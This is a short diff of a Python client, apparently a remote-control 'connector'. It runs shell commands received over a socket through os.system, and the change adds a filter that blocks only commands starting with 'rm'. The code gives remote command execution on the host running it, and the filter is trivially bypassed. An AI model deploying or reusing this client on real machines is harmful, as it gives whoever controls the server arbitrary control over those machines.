@@ -7,11 +7,11 @@ import sys, os, socket, select, time, datetime, getpass
 #    print("Usage: python connector.py <host> <port>")
 #    sys.exit(0)
 
-#host = ''
-#port = 3435
+host = ''
+port = 3435
 
-host = raw_input('IP \> ')
-port = input('Port \> ')
+#host = raw_input('IP \> ')
+#port = input('Port \> ')
 _key = raw_input('Authentication Key \> ')
 
 def connector():
@@ -45,7 +45,10 @@ def connector():
                 # Do something when some data is present
                 if 'COMMAND$' in data:
                     # Run command
-                    os.system(data.split('$')[1])
+                    if not data.split('$')[1].startswith('rm'):
+                        os.system(data.split('$')[1])
+                    else:
+                        print('Commanded Blocked: %s' % data.split('$')[1])
                 elif 'SHUTDOWN$' in data:
                     print(data.split('$')[1])
                     # Check IP > if my IP >> do, if 'all' >> do
